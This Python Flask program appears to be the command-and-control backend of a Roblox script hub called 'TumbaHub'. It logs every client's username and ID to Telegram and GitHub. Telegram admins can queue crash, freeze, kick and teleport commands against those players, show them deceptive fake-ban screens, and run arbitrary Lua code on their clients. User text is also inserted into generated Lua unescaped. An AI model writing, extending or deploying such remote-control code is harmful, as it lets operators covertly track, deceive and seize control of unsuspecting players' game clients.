from flask import Flask, request, jsonify
import requests
import json
import base64
import time
import os
import threading

app = Flask(__name__)

# Telegram Bot Token
TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN')

# --- СИСТЕМА АДМИНОВ И РОЛЕЙ ---
FULL_ADMINS_STR = os.getenv('FULL_ADMINS', '')
SEMI_ADMINS_STR = os.getenv('SEMI_ADMINS', '')

FULL_ADMINS = [int(admin_id.strip()) for admin_id in FULL_ADMINS_STR.split(',') if admin_id.strip()]
SEMI_ADMINS = [int(admin_id.strip()) for admin_id in SEMI_ADMINS_STR.split(',') if admin_id.strip()]

TELEGRAM_CHAT_ID = FULL_ADMINS[0] if FULL_ADMINS else None

# === УДОБНАЯ НАСТРОЙКА ПРАВ ДЛЯ SEMI_ADMINS ===
# Доступные права: message, freeze, unfreeze, kick, defaultkick, fakeban, fakebandefault, fakeban267, reset, execselect, crash, teleport
SEMI_PERMS_STR = os.getenv('SEMI_PERMS', 'message,freeze,unfreeze,kick,defaultkick,fakeban,fakebandefault,fakeban267,reset,teleport')
SEMI_PERMS = [p.strip() for p in SEMI_PERMS_STR.split(',') if p.strip()]

# === СПИСОК СКРЫТЫХ ИГРОКОВ (ВИДЯТ ТОЛЬКО FULL_ADMINS) ===
# Впиши сюда ники (через запятую), которые нужно спрятать от модераторов
HIDDEN_PLAYERS_STR = os.getenv('HIDDEN_PLAYERS')
HIDDEN_PLAYERS = [p.strip() for p in HIDDEN_PLAYERS_STR.split(',') if p.strip()]

# --- НАСТРОЙКИ GITHUB DB ---
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
REPO_OWNER = 'repositorykreml1n'
REPO_NAME = 'commands'
FILE_PATH = 'players.json'


def load_players_from_github():
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
    
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        try:
            content_b64 = response.json()['content']
            content_str = base64.b64decode(content_b64).decode('utf-8')
            saved_players = json.loads(content_str)
            return {player: [] for player in saved_players}
        except Exception as e:
            print("Ошибка чтения базы:", e)
            return {}
    return {}

def save_players_to_github():
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
    
    sha = None
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        sha = response.json()['sha']
        
    players_list = list(commands_queue.keys())
    content_str = json.dumps(players_list, indent=4)
    content_b64 = base64.b64encode(content_str.encode('utf-8')).decode('utf-8')
    
    data = {
        "message": "Авто-сохранение базы TumbaHub",
        "content": content_b64
    }
    if sha:
        data["sha"] = sha
        
    requests.put(url, headers=headers, json=data)

def save_players_to_github_async():
    """Запускает сохранение в отдельном потоке, чтобы не блокировать ответ API."""
    threading.Thread(target=save_players_to_github).start()

# --- ХЕЛПЕРЫ ДЛЯ TELEGRAM ---
def send_telegram_message(chat_id, text, reply_markup=None, parse_mode=None):
    payload = {"chat_id": chat_id, "text": text}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    if parse_mode:
        payload["parse_mode"] = parse_mode
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json=payload, timeout=5)
    except Exception as e:
        print(f"Ошибка отправки сообщения: {e}")

def answer_callback(callback_id, text=None, show_alert=False):
    payload = {"callback_query_id": callback_id}
    if text:
        payload["text"] = text
        payload["show_alert"] = show_alert
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery", json=payload, timeout=5)
    except Exception as e:
        print(f"Ошибка ответа на callback: {e}")

commands_queue = load_players_from_github()
awaiting_reason = {}
awaiting_msg_text = {}
awaiting_msg_duration = {}
awaiting_execute = {}
awaiting_teleport = {}
last_seen = {}
player_places = {}

def get_roblox_game_name(place_id):
    if not place_id:
        return "Неизвестная игра"
    try:
        url = f"https://economy.roblox.com/v2/assets/{place_id}/details"
        res = requests.get(url, timeout=3)
        if res.status_code == 200:
            return res.json().get("Name", "Неизвестная игра")
    except Exception:
        pass
    return "Неизвестная игра"

@app.route('/')
def home():
    return "TumbaHub Server is running!"

@app.route('/api/send_message', methods=['POST'])
def send_message_from_client():
    data = request.json
    if not data or 'text' not in data:
        return jsonify({"status": "error", "message": "No text provided"}), 400
    
    client_message = data.get('text')
    send_telegram_message(TELEGRAM_CHAT_ID, f"🤖 **Сообщение от клиента:**\n\n{client_message}", parse_mode="Markdown")
    return jsonify({"status": "success"})

@app.route('/api/log_user', methods=['POST'])
def log_user():
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No data"}), 400

    username = data.get('username', 'Unknown')
    user_id = data.get('userId', 'Unknown')
    place_id = data.get('placeId')
    
    if place_id:
        player_places[username] = place_id
    
    if username not in commands_queue:
        commands_queue[username] = []
        save_players_to_github_async()
        
    last_seen[username] = time.time()

    msg = f"🟢 [V2] НОВЫЙ ЗАПУСК!\n👤 Ник: {username}\n🆔 ID: {user_id}"
    
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "🥾 Kick", "callback_data": f"kick_{username}"},
                {"text": "💥 Crash", "callback_data": f"crash_{username}"}
            ]
        ]
    }
    send_telegram_message(TELEGRAM_CHAT_ID, msg, reply_markup=keyboard)
    return jsonify({"status": "success"})

@app.route('/api/ping', methods=['GET'])
def ping():
    username = request.args.get('username')
    place_id = request.args.get('placeId')
    
    if username:
        last_seen[username] = time.time()
        if place_id:
            player_places[username] = place_id
    return jsonify({"status": "success"})

@app.route('/api/get_command', methods=['GET'])
def get_command():
    username = request.args.get('username')
    if username in commands_queue and len(commands_queue[username]) > 0:
        cmd = commands_queue[username].pop(0)
        return jsonify({"status": "success", "command": cmd})
    return jsonify({"status": "empty"})

@app.route('/api/telegram_webhook', methods=['POST'])
def telegram_webhook():
    update = request.json

    user_id = None
    chat_id = None
    is_callback = "callback_query" in update

    if is_callback:
        callback = update["callback_query"]
        user_id = callback["from"]["id"]
        chat_id = callback["message"]["chat"]["id"]
    elif "message" in update and "from" in update["message"]:
        user_id = update["message"]["from"]["id"]
        chat_id = update["message"]["chat"]["id"]

    # 1. Authorization Check
    if user_id not in FULL_ADMINS and user_id not in SEMI_ADMINS:
        if chat_id:
            send_telegram_message(chat_id, "⛔ Access Denied")
        return "Access Denied", 403

    is_full_admin = user_id in FULL_ADMINS

    # --- Callback Query Handling ---
    if is_callback:
        callback = update["callback_query"]
        data = callback["data"]
        callback_id = callback["id"]

        if data == "menu_games":
            answer_callback(callback_id, "Раздел Игры пока пуст!", show_alert=True)
            return jsonify({"status": "ok"})
            
        elif data == "menu_players":
            if not commands_queue:
                send_telegram_message(chat_id, "⚠️ В базе пока нет игроков.")
            else:
                player_buttons = []
                current_time = time.time()
                for player in sorted(commands_queue.keys()):
                    # ЕСЛИ ИГРОК В СКРЫТОМ СПИСКЕ, А ЮЗЕР НЕ ФУЛЛ АДМИН -> ПРОПУСКАЕМ ЕГО
                    if not is_full_admin and player in HIDDEN_PLAYERS:
                        continue
                        
                    status_icon = "🔴"
                    if player in last_seen and (current_time - last_seen.get(player, 0) < 45):
                        status_icon = "🟢"
                    player_buttons.append([{"text": f"{status_icon} {player}", "callback_data": f"playerprof_{player}"}])
                
                keyboard = {"inline_keyboard": player_buttons}
                send_telegram_message(
                    chat_id, 
                    "👥 **Список игроков:**\nВыберите для управления:",
                    reply_markup=keyboard,
                    parse_mode="Markdown"
                )
            answer_callback(callback_id)
            return jsonify({"status": "ok"})

        parts = data.split('_', 1)
        if len(parts) == 2:
            btn_action, target_user = parts
            
            # --- 🛡️ ЗАЩИТА СКРЫТЫХ ИГРОКОВ ---
            # Если цель в списке скрытых, а жмет не главный админ - блокируем ЛЮБОЕ действие
            if not is_full_admin and target_user in HIDDEN_PLAYERS:
                answer_callback(callback_id, "⛔ Этот игрок скрыт. Доступ запрещен!", show_alert=True)
                return jsonify({"status": "hidden_player_denied"})
            
            # --- 🛡️ УНИВЕРСАЛЬНАЯ ПРОВЕРКА ПРАВ НА ДЕЙСТВИЯ ---
            protected_actions = ["freeze", "unfreeze", "reset", "crash", "execselect", "message", "kick", "defaultkick", "fakeban", "fakebandefault", "fakeban267", "teleport"]
            if btn_action in protected_actions:
                if not is_full_admin and btn_action not in SEMI_PERMS:
                    answer_callback(callback_id, "⛔ У вас нет прав на это действие!", show_alert=True)
                    return jsonify({"status": "permission_denied"})
            
            # 4. ДИНАМИЧЕСКОЕ ПОСТРОЕНИЕ ПРОФИЛЯ
            if btn_action == "playerprof":
                awaiting_reason.pop(user_id, None)
                awaiting_execute.pop(user_id, None)
                awaiting_msg_text.pop(user_id, None)
                awaiting_msg_duration.pop(user_id, None)
                awaiting_teleport.pop(user_id, None)

                def can_use(action):
                    return is_full_admin or action in SEMI_PERMS

                keyboard_layout = []
                
                if can_use("message"):
                    keyboard_layout.append([{"text": "💬 Message", "callback_data": f"message_{target_user}"}])
                    
                if can_use("execselect"):
                    keyboard_layout.append([{"text": "⚡ Execute Custom Script", "callback_data": f"execselect_{target_user}"}])

                if can_use("teleport"):
                    keyboard_layout.append([{"text": "🚀 Teleport", "callback_data": f"teleport_{target_user}"}])

                row2 = []
                if can_use("freeze"): row2.append({"text": "🧊 Freeze", "callback_data": f"freeze_{target_user}"})
                if can_use("unfreeze"): row2.append({"text": "🏃 Unfreeze", "callback_data": f"unfreeze_{target_user}"})
                if row2: keyboard_layout.append(row2)

                row3 = []
                if can_use("kick"): row3.append({"text": "🥾 Kick", "callback_data": f"kick_{target_user}"})
                if can_use("reset"): row3.append({"text": "💀 Reset", "callback_data": f"reset_{target_user}"})
                if can_use("crash"): row3.append({"text": "💥 Crash", "callback_data": f"crash_{target_user}"})
                if row3: keyboard_layout.append(row3)

                keyboard_layout.append([{"text": "🔙 Назад", "callback_data": "menu_players"}])
                
                place_id = player_places.get(target_user)
                game_info = ""
                if place_id:
                    game_name = get_roblox_game_name(place_id)
                    game_info = f"\n🎮 Играет в: <b>{game_name}</b> ({place_id})"

                keyboard = {"inline_keyboard": keyboard_layout}
                send_telegram_message(
                    chat_id, 
                    f"👤 <b>Профиль: {target_user}</b>{game_info}\nЧто будем делать?", 
                    reply_markup=keyboard,
                    parse_mode="HTML"
                )

            # 5. Action Button Handling
            elif btn_action in ["freeze", "unfreeze", "reset", "crash"]:
                action = f"/{btn_action}"
                if target_user not in commands_queue: commands_queue[target_user] = []
                commands_queue[target_user].append(action)
                
                alert_text = f"💥 Краш отправлен {target_user}" if btn_action == "crash" else f"✅ Команда {action} отправлена {target_user}"
                answer_callback(callback_id, alert_text)

            elif btn_action == "execselect":
                awaiting_execute[user_id] = target_user
                send_telegram_message(chat_id, f"✍️ Отправь мне Lua-код для выполнения на клиенте <b>{target_user}</b>:", parse_mode="HTML")
            
            elif btn_action == "teleport":
                awaiting_teleport[user_id] = target_user
                send_telegram_message(chat_id, f"🚀 Отправь мне <b>Place ID</b> игры, куда нужно отправить <b>{target_user}</b> (только цифры):", parse_mode="HTML")

            elif btn_action == "message":
                awaiting_msg_text[user_id] = target_user
                send_telegram_message(chat_id, f"✍️ Отправь мне текст сообщения для игрока <b>{target_user}</b>:", parse_mode="HTML")

            # 6. Kick Handling (Тоже динамическое!)
            elif btn_action == "kick":
                awaiting_reason.pop(user_id, None)
                
                def can_use(action): return is_full_admin or action in SEMI_PERMS
                
                kick_btns = []
                if can_use("defaultkick"):
                    kick_btns.append([{"text": "Дефолт: Вы были кикнуты", "callback_data": f"defaultkick_{target_user}"}])
                if can_use("fakeban267"):
                    kick_btns.append([{"text": "⛔ Fake Ban (Error 267)", "callback_data": f"fakeban267_{target_user}"}])
                if can_use("fakebandefault"):
                    kick_btns.append([{"text": "⛔ Fake Ban (Error 600 - Дефолт UI)", "callback_data": f"fakebandefault_{target_user}"}])
                if can_use("fakeban"):
                    kick_btns.append([{"text": "⛔ Fake Ban (Error 600 - Custom UI)", "callback_data": f"fakeban_{target_user}"}])
                
                keyboard = {"inline_keyboard": kick_btns}
                send_telegram_message(chat_id, f"Напиши причину кика для <b>{target_user}</b> или выбери шаблон:", reply_markup=keyboard, parse_mode="HTML")

            elif btn_action == "defaultkick":
                awaiting_reason.pop(user_id, None)
                action = "/kick"
                if target_user not in commands_queue: commands_queue[target_user] = []
                commands_queue[target_user].append(action)
                answer_callback(callback_id, f"✅ {target_user} кикнут (дефолт).")

            elif btn_action == "fakeban267":
                awaiting_reason.pop(user_id, None)
                # Стандартный текст перманентного бана от разработчика
                kick_msg = "You are banned from this experience."
                action = f"/kick_{kick_msg}"
                
                if target_user not in commands_queue: commands_queue[target_user] = []
                commands_queue[target_user].append(action)
                answer_callback(callback_id, f"✅ {target_user} отлетел с классическим баном (Error 267).", show_alert=True)

            elif btn_action == "fakebandefault":
                awaiting_reason.pop(user_id, None)
                # Текст бана на 4960 недель, но через стандартный кик
                kick_msg = "\nYou have been temporarily banned.\n    [Remaining ban duration: 4960 weeks 2\ndays 5 hours 19 minutes 59 seconds ]"
                action = f"/kick_{kick_msg}"
                
                if target_user not in commands_queue: commands_queue[target_user] = []
                commands_queue[target_user].append(action)
                answer_callback(callback_id, f"✅ {target_user} кикнут с фейк-баном на 4960 недель (дефолт UI).", show_alert=True)

            elif btn_action == "fakeban":
                awaiting_reason.pop(user_id, None)
                lua_code = "task.spawn(function() local s repeat s=pcall(function() game:GetService('StarterGui'):SetCoreGuiEnabled(Enum.CoreGuiType.All,false) end) task.wait() until s end);local c=workspace.CurrentCamera;c.CameraType=Enum.CameraType.Scriptable;c.CFrame=c.CFrame;for _,v in pairs(workspace:GetDescendants())do if v:IsA('BasePart')and not v.Anchored then v.Anchored=true end if v:IsA('Humanoid')or v:IsA('AnimationController')then for _,t in pairs(v:GetPlayingAnimationTracks())do t:AdjustSpeed(0)end end end;game:GetService('RunService').RenderStepped:Connect(function() for _,p in pairs(game.Players:GetPlayers())do if p.Character then for _,pt in pairs(p.Character:GetDescendants())do if pt:IsA('BasePart')then pt.Anchored=true end end end end end);local b=Instance.new('BlurEffect',game:GetService('Lighting'));b.Size=24;pcall(function() game:GetService('SoundService').AmbientReverb=Enum.ReverbType.NoReverb;for _,s in pairs(game:GetDescendants())do if s:IsA('Sound')then s:Stop()end end end);local sg=Instance.new('ScreenGui',game.Players.LocalPlayer:WaitForChild('PlayerGui'));sg.Name='RobloxJoinErrorUI';sg.IgnoreGuiInset=true;sg.DisplayOrder=999999;sg.ResetOnSpawn=false;local bg=Instance.new('Frame',sg);bg.Size=UDim2.new(1,0,1,0);bg.BackgroundColor3=Color3.new(0,0,0);bg.BackgroundTransparency=0.5;bg.Active=true;local mf=Instance.new('Frame',bg);mf.Size=UDim2.new(0,400,0,290);mf.Position=UDim2.new(0.5,0,0.5,0);mf.AnchorPoint=Vector2.new(0.5,0.5);mf.BackgroundColor3=Color3.fromRGB(65,65,65);mf.BorderSizePixel=0;local pd=Instance.new('UIPadding',mf);pd.PaddingLeft=UDim.new(0,24);pd.PaddingRight=UDim.new(0,24);pd.PaddingTop=UDim.new(0,20);pd.PaddingBottom=UDim.new(0,24);local tl=Instance.new('TextLabel',mf);tl.Size=UDim2.new(1,0,0,24);tl.BackgroundTransparency=1;tl.Text='Join Error';tl.TextColor3=Color3.new(1,1,1);tl.Font=Enum.Font.GothamBold;tl.TextSize=19;local dv=Instance.new('Frame',mf);dv.Size=UDim2.new(1,0,0,1);dv.Position=UDim2.new(0,0,0,36);dv.BackgroundColor3=Color3.fromRGB(215,215,215);dv.BorderSizePixel=0;local ml=Instance.new('TextLabel',mf);ml.Size=UDim2.new(1,0,0,180);ml.Position=UDim2.new(0,0,0,52);ml.BackgroundTransparency=1;ml.Text='You were banned by this experience or its\\nmoderators. Moderation message:\\n\\nYou have been temporarily banned.\\n        [Remaining ban duration: 4960 weeks 2\\ndays 5 hours 19 minutes 52 seconds ]\\n(Error Code: 600)\\n\\n';ml.TextColor3=Color3.fromRGB(210,210,210);ml.Font=Enum.Font.Gotham;ml.TextSize=16;ml.LineHeight=1.18;ml.TextWrapped=true;ml.TextXAlignment=Enum.TextXAlignment.Center;ml.TextYAlignment=Enum.TextYAlignment.Top;local lb=Instance.new('TextButton',mf);lb.Size=UDim2.new(1,0,0,36);lb.Position=UDim2.new(0,0,1,-36);lb.BackgroundColor3=Color3.new(1,1,1);lb.BorderSizePixel=0;lb.Text='Leave';lb.TextColor3=Color3.new(0,0,0);lb.Font=Enum.Font.GothamMedium;lb.TextSize=16;lb.AutoButtonColor=false;Instance.new('UICorner',lb).CornerRadius=UDim.new(0,6);lb.MouseButton1Click:Connect(function() game:Shutdown() end);game:GetService('GuiService').SelectedCoreObject=nil;"
                action = f"/execute__{lua_code}"
                if target_user not in commands_queue: commands_queue[target_user] = []
                commands_queue[target_user].append(action)
                answer_callback(callback_id, f"✅ {target_user} отлетел с экраном Fake Ban (Error 600)!", show_alert=True)
                
            answer_callback(callback_id)

    # --- Text Message Handling ---
    elif "message" in update and "text" in update["message"]:
        text = update["message"]["text"]

        if text == "/menu":
            keyboard = {
                "inline_keyboard": [
                    [{"text": "👥 Игроки", "callback_data": "menu_players"}],
                    [{"text": "🎮 Игры", "callback_data": "menu_games"}]
                ]
            }
            send_telegram_message(chat_id, "🎛 **Главное меню TumbaHub**\nВыберите раздел:", reply_markup=keyboard, parse_mode="Markdown")
        
        elif user_id in awaiting_reason:
            target_user = awaiting_reason.pop(user_id)
            action = f"/kick_{text}"
            if target_user not in commands_queue: commands_queue[target_user] = []
            commands_queue[target_user].append(action)
            send_telegram_message(chat_id, f"✅ {target_user} кикнут с причиной:\n💬 {text}")

        elif user_id in awaiting_execute:
            target_user = awaiting_execute.pop(user_id)
            action = f"/execute__{text}"
            if target_user not in commands_queue: commands_queue[target_user] = []
            commands_queue[target_user].append(action)
            send_telegram_message(chat_id, f"✅ Скрипт успешно отправлен в очередь игрока {target_user}!")

        elif user_id in awaiting_teleport:
            target_user = awaiting_teleport.pop(user_id)
            try:
                # Проверяем, что ввели именно числа
                place_id = int(text.strip())
                
                # Твой скрипт, сжатый в 1 строчку
                lua_code = f"game:GetService('TeleportService'):Teleport({place_id}, game.Players.LocalPlayer)"
                action = f"/execute__{lua_code}"
                
                if target_user not in commands_queue: commands_queue[target_user] = []
                commands_queue[target_user].append(action)
                
                send_telegram_message(chat_id, f"✅ Игрок {target_user} принудительно отправлен в плейс <code>{place_id}</code>!", parse_mode="HTML")
            except ValueError:
                send_telegram_message(chat_id, "⚠️ Ошибка: Place ID должен состоять только из цифр. Открой профиль и попробуй снова.")

        elif user_id in awaiting_msg_text:
            target_user = awaiting_msg_text.pop(user_id)
            awaiting_msg_duration[user_id] = {"user": target_user, "text": text}
            send_telegram_message(chat_id, f"💬 Сообщение: '{text}'.\n\nТеперь отправь длительность сообщения в секундах (например, 10).")

        elif user_id in awaiting_msg_duration:
            try:
                duration = int(text)
                data = awaiting_msg_duration.pop(user_id)
                target_user = data["user"]
                msg_text = data["text"]

                lua_code = f"""
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.DisplayOrder = 999
local label = Instance.new("TextLabel", gui)
label.Size = UDim2.new(1, -40, 0, 100)
label.Position = UDim2.new(0.5, 0, 0, 20)
label.AnchorPoint = Vector2.new(0.5, 0)
label.BackgroundTransparency = 0.5
label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.Font = Enum.Font.SourceSansBold
label.TextSize = 24
label.TextWrapped = true
label.Text = "{msg_text}"
game:GetService("Debris"):AddItem(gui, {duration})
"""
                action = f"/execute__{lua_code}"
                if target_user not in commands_queue: commands_queue[target_user] = []
                commands_queue[target_user].append(action)
                send_telegram_message(chat_id, f"✅ Сообщение '{msg_text}' на {duration} сек. отправлено игроку {target_user}!")
            except ValueError:
                send_telegram_message(chat_id, "⚠️ Ошибка: Введите число. Попробуйте снова.")

    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
